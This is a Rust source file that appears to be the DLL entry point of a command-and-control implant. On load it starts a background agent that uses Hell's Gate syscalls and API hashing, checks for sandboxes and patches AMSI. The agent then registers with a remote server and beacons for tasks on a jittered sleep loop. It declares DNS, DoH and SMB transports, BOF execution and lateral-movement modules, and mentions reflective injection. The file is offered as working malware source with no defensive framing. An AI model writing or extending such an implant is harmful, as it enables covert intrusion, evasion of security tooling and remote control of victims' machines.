/// DLL entry point — starts the agent in a background thread.
/// Compile with: [lib] crate-type = ["cdylib"] in Cargo.toml
/// The DLL can be loaded via LoadLibrary, rundll32, or reflective injection.

mod config {
    include!(concat!(env!("OUT_DIR"), "/config.rs"));
}
mod crypto;
mod transport;
mod transport_dns;
mod transport_doh;
#[cfg(target_os = "windows")]
mod transport_smb;
#[cfg(target_os = "windows")]
mod hells_gate;
#[cfg(target_os = "windows")]
mod api_hash;
mod commands;
#[cfg(target_os = "windows")]
mod evasion;
#[cfg(target_os = "windows")]
mod dotnet;
#[cfg(target_os = "windows")]
pub mod bof;
pub mod lateral;

#[cfg(target_os = "windows")]
use std::os::raw::c_void;

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: *mut c_void,
    reason: u32,
    _reserved: *mut c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(agent_main);
    }
    1
}

fn agent_main() {
    use commands::{DYN_SLEEP_SEC, DYN_JITTER_PCT};
    use std::sync::atomic::Ordering;

    #[cfg(target_os = "windows")]
    {
        hells_gate::init();
        api_hash::init();
        evasion::sandbox_check();
        evasion::patch_amsi();
    }

    let mut t = transport::AgentTransport::new();
    loop {
        t.register();
        if !t.agent_id.is_empty() { break; }
        std::thread::sleep(std::time::Duration::from_secs(30));
    }
    loop {
        let tasks = t.beacon();
        for task in tasks {
            commands::dispatch(&mut t, &task);
        }
        let base = {
            let s = DYN_SLEEP_SEC.load(Ordering::Relaxed);
            if s == u64::MAX { config::SLEEP_SEC } else { s }
        } * 1000;
        let pct = {
            let j = DYN_JITTER_PCT.load(Ordering::Relaxed);
            if j == u64::MAX { config::JITTER_PCT } else { j }
        };
        let sleep_ms = if pct == 0 { base } else {
            let jit = (base * pct / 100) as i64;
            let mut r = [0u8; 8];
            crypto::random_bytes(&mut r);
            let delta = (i64::from_le_bytes(r).abs() % (jit * 2 + 1)) - jit;
            (base as i64 + delta).max(1000) as u64
        };
        std::thread::sleep(std::time::Duration::from_millis(sleep_ms));
    }
}
